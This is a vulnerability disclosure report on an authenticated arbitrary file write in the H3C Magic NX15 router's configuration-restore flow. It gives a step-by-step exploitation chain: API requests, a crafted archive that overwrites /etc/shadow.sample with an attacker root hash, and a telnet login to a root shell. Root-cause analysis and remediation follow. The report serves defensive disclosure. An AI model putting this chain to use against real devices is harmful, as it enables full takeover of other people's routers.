# H3C Magic NX15 `esps.system.importprofile` Authenticated Arbitrary File Write to Root Shell Access

## Vulnerability Summary

- Discovery date: 2026-05-25
- Vendor: H3C
- Product: H3C Magic NX15 Wireless Router
- Verified firmware / software version: NX15V100R017
- Affected version(s): NX15V100R017 confirmed; other versions not verified
- Component: `esps.system.importprofile` configuration-restore flow
- Reachable endpoint: `POST /api/upload`, `POST /api/esps`
- Reachable method / action: `esps.system.importprofile`
- Authentication: administrator
- Attack vector: remote
- Impact: authenticated arbitrary file write leading to root shell access after reboot
- Root cause class: unsafe archive extraction / authenticated arbitrary file write
- Candidate CWEs: `CWE-73`, `CWE-22`
- Disclosure status: private
- CNVD ID: pending

## CNVD Submission Summary

H3C Magic NX15 firmware `NX15V100R017` contains an authenticated arbitrary file write vulnerability in `esps.system.importprofile`, reachable through `POST /api/esps` after configuration upload to `POST /api/upload`. The vulnerable code path accepts attacker-controlled archive content through a crafted `NX15.cfg` restore package and passes the validated inner archive to `tar -xzvf` at `/` without restricting archive members to `mnt/config/*`. This allows a remote attacker with administrator access to overwrite arbitrary files on the device.

The issue was verified by a live exploitation chain that overwrote `/etc/shadow.sample`, triggered `importprofile`, waited for the forced reboot, and then logged in on TCP/99 as `root` with the attacker-chosen password `admin123`. On the tested target, the final observable proof was the shell prompt `root@NX15:/tmp/root#`.

## Attack Surface

The issue is reachable through the H3C web management API. The attacker first authenticates to `POST /api/login/auth` and reuses the returned session value in the `AUTHENTICATION` header. The attacker then uploads a crafted binary backup to `POST /api/upload?type=cfg...` and invokes `esps.system.importprofile` through `POST /api/esps`. The attacker-controlled material is the uploaded `NX15.cfg`, specifically the member paths and contents inside its inner `NX15.tar.gz` archive.

```json
[
  {
    "id": 1,
    "object": "esps.system",
    "method": "importprofile",
    "param": {
      "chkSum": "34813920d31bc1567d892c4bc133823b",
      "path": "/tmp/NX15.cfg"
    }
  }
]
```

Verified fact: the supplied PoC computes `chkSum` dynamically from the crafted package. One local reproduction build from the supplied files on `2026-05-25` produced `chkSum=34813920d31bc1567d892c4bc133823b` and `fileSize=7585`.

## Authentication Boundary

### Pattern B: authenticated

This issue requires a valid web administrator session token returned by `POST /api/login/auth`.

Minimum authenticated flow:

1. Send `POST /api/login/auth` with `{"username":"admin","password":"admin123"}` on the verified target.
2. Read the session token from the JSON response field `data.session`.
3. Reuse that value in the `AUTHENTICATION` header for `POST /api/upload`.
4. Reuse the same header for `POST /api/esps` when invoking `esps.system.importprofile`.

The issue is still exploitable if the attacker already has a valid session token and skips the login sequence above.

## Root Cause

### 1. Vulnerable input source

The restore flow consumes attacker-controlled data from the uploaded `NX15.cfg` package. The verified PoC preserves normal `mnt/config/*` content but adds an extra member, `etc/shadow.sample`, inside the inner `NX15.tar.gz`. The subsequent `importprofile` request only supplies the uploaded file path and its MD5 value; once the archive is accepted, member paths inside the archive are trusted.

### 2. Vulnerable sink

Verified fact: the extracted `esps.system` script validates product/version/MD5 metadata and then extracts the inner archive at the filesystem root.

```sh
is_valid_cfg()
{
    path="${1}"
    hostName=$(uci get system.system.hostname)
    cd /tmp/
    file_encrypt ${path} "${hostName}"_org.tar.gz
    tar -xzvf "${hostName}"_org.tar.gz > /dev/null || return 1
    ...
    md5Cacl=$(md5sum "${hostName}".tar.gz | awk '{print $1}')
    if [ "${productName}" != "${productNameCfg}" ] || [ "${verV}" != "${verVCfg}" ] || [ ${verRCfg} -gt ${verR} ] || [ "${md5InfoCfg}" != "${md5Cacl}" ];then
        return 1
    fi
}

...

importprofile)
    json_get_var _chkSum chkSum
    json_get_var _path path
    ...
    if ! is_valid_cfg "${_path}";then
        rm -rf "${_path}" /tmp/"${hostName}"*
        code=532
    else
        rm -rvf /mnt/config/* > /dev/null
        cd / && tar -xzvf /tmp/"${hostName}".tar.gz > /dev/null
    fi
```

The dangerous operation is the unrestricted extraction of `/tmp/"${hostName}".tar.gz` at `/`.

### 3. Why exploitation works

- The uploaded restore package is attacker-controlled.
- `is_valid_cfg()` verifies version and MD5 metadata but does not enforce an allowlist of archive member paths.
- `importprofile` extracts the validated inner archive at `/`, not inside `/mnt/config`.
- An archive member such as `etc/shadow.sample` therefore overwrites a live system file outside the intended configuration subtree.
- `rcS` later copies `/etc/shadow.sample` to `/var/shadow` during boot.
- The changed password database makes the attacker-chosen root password effective after reboot.

### 4. Why naive payloads fail

- A restore package limited to `mnt/config/*` does not change root authentication state.
- The verified chain targets `/etc/shadow.sample`, not `/etc/shadow`, because the boot script copies `/etc/shadow.sample` to `/var/shadow`.
- The root-shell effect is not immediate; `importprofile` forces a reboot, and the password change is only observable after TCP/99 returns.

## Reverse Engineering Evidence

### Primary function / handler evidence

- file / module: `esps.system`
- function name: `is_valid_cfg()` and `importprofile`
- function address: `N/A`
- function size: `N/A`

Relevant decompiled or source-level snippet:

```sh
is_valid_cfg()
{
    path="${1}"
    hostName=$(uci get system.system.hostname)
    cd /tmp/
    file_encrypt ${path} "${hostName}"_org.tar.gz
    tar -xzvf "${hostName}"_org.tar.gz > /dev/null || return 1
    ...
    md5Cacl=$(md5sum "${hostName}".tar.gz | awk '{print $1}')
    if [ "${productName}" != "${productNameCfg}" ] || [ "${verV}" != "${verVCfg}" ] || [ ${verRCfg} -gt ${verR} ] || [ "${md5InfoCfg}" != "${md5Cacl}" ];then
        return 1
    fi
}

...

importprofile)
    json_get_var _chkSum chkSum
    json_get_var _path path
    if ! is_valid_cfg "${_path}";then
        rm -rf "${_path}" /tmp/"${hostName}"*
        code=532
    else
        rm -rvf /mnt/config/* > /dev/null
        cd / && tar -xzvf /tmp/"${hostName}".tar.gz > /dev/null
    fi
```

Verified fact: the current evidence set shows metadata checks, but no member-path restriction for the extracted inner archive.

### Control-flow or data-flow summary

`POST /api/login/auth` -> session token -> `POST /api/upload` stores crafted `NX15.cfg` at `/tmp/NX15.cfg` -> `POST /api/esps` `esps.system.importprofile` -> `is_valid_cfg()` -> `file_encrypt` -> `tar -xzvf "${hostName}"_org.tar.gz` -> version/MD5 checks -> `cd / && tar -xzvf /tmp/"${hostName}".tar.gz` -> overwrite `/etc/shadow.sample`

### Secondary component evidence

- file / script / service: `rcS`
- role in exploitation: copies the overwritten `/etc/shadow.sample` into the active password database during boot

Relevant snippet:

```sh
#for console login
cp /etc/shadow.sample /var/shadow
```

## Verified Exploitation Chain

### Mode A: crafted restore archive with `shadow.sample` overwrite

- prerequisites: network reachability to `192.168.8.1`; valid administrator credentials; ability to wait for reboot and reconnect to TCP/99
- injected field / primitive: attacker-controlled inner archive member `etc/shadow.sample` inside uploaded `NX15.cfg`
- target path / object / resource: `/etc/shadow.sample`
- verified payload:

```text
etc/shadow.sample
root:$1$KEKJV2R0$MvyfCv8MR6g364HPiH01N0:14587:0:99999:7:::
nobody:*:14495:0:99999:7:::
```

Effect:

1. The attacker authenticates to `/api/login/auth` and obtains a session token.
2. The attacker uploads a crafted `NX15.cfg` whose inner archive contains normal `mnt/config/*` entries plus `etc/shadow.sample`.
3. The attacker invokes `esps.system.importprofile` for `/tmp/NX15.cfg`; the restore flow extracts the inner archive at `/` and reboots the device.
4. After reboot, `rcS` copies `/etc/shadow.sample` to `/var/shadow`; TCP/99 returns, and the login sequence `H3C` / `admin123` (intentional failure) followed by `root` / `admin123` reaches `root@NX15:/tmp/root#`.

## Live Exploitation Evidence

### PoC-generated payload

```text
Inner archive member: etc/shadow.sample
Root hash: $1$KEKJV2R0$MvyfCv8MR6g364HPiH01N0
NX15.info version: NX15V100R017
Inner archive MD5 from one local reproduction build: 8f9066fc4e585efa4c186256a9073095
Uploaded NX15.cfg MD5 from the same build: 34813920d31bc1567d892c4bc133823b
Uploaded NX15.cfg size from the same build: 7585 bytes
```

### PoC-sent request body

```json
[
  {
    "id": 1,
    "object": "esps.system",
    "method": "importprofile",
    "param": {
      "chkSum": "34813920d31bc1567d892c4bc133823b",
      "path": "/tmp/NX15.cfg"
    }
  }
]
```

The corresponding upload request used `POST /api/upload?type=cfg&chkSum=34813920d31bc1567d892c4bc133823b&fileSize=7585&fileName=NX15.cfg` with the crafted binary package as the body.

### Success condition

The verified success sequence was:

- `POST /api/esps` disconnected as the device rebooted.
- `99/tcp` reappeared after reboot.
- Telnet interaction showed `Login: H3C`, then `Password: admin123` -> `Login incorrect`, then `NX15 login: root`, then `Password: admin123`.
- The final prompt was `root@NX15:/tmp/root#`.
- The shell banner included `RLX Linux version 2.0` and `BusyBox v1.30.1`.

## Why This Is Root Code Execution

The verified primitive is not limited to restoring user configuration under `/mnt/config`. The restore flow writes attacker-chosen files at `/`, and the verified boot script later copies the overwritten `/etc/shadow.sample` into the live password database. Because the device exposes telnet on TCP/99 after reboot and the verified transcript reaches `root@NX15:/tmp/root#`, the issue yields authenticated remote root shell access rather than a constrained configuration-only file write.


## Minimal Vulnerable Flow

```text
Authenticated remote attacker
  -> POST /api/login/auth
  -> POST /api/upload with crafted NX15.cfg
  -> POST /api/esps -> esps.system.importprofile
  -> is_valid_cfg() accepts metadata and MD5
  -> cd / && tar -xzvf /tmp/"${hostName}".tar.gz
  -> overwrite /etc/shadow.sample
  -> reboot -> rcS copies /etc/shadow.sample to /var/shadow
  -> telnet login as root
  -> root@NX15:/tmp/root#
```

## PoC Command Examples

### Example command

```powershell
python3 poc_r017_import_shadow_sample_shell.py
```

## Reproduction Notes

- target environment: H3C Magic NX15 router, firmware `NX15V100R017`
- network assumptions: local LAN reachability to `192.168.8.1`
- required attacker setup: the supplied PoC file, the extracted `r017_inner_cfg\mnt` directory, and valid administrator credentials
- expected output: the device reboots after `importprofile`, TCP/99 returns, and the login sequence reaches `root@NX15:/tmp/root#`
- common failure cases: invalid `chkSum` yields restore rejection; malformed restore packages fail validation; telnet login attempted before reboot completes

## Remediation Ideas

- Extract restore archives into a staging directory, not `/`.
- Enforce a strict allowlist of archive members limited to `mnt/config/*`.
- Reject absolute paths, `..` segments, symlinks, hard links, and any archive member outside the intended configuration subtree.
- Validate the inner archive contents, not only product/version/MD5 metadata.
- Keep restore functionality behind administrator authentication, but also treat uploaded archives as untrusted input and sanitize member paths before extraction.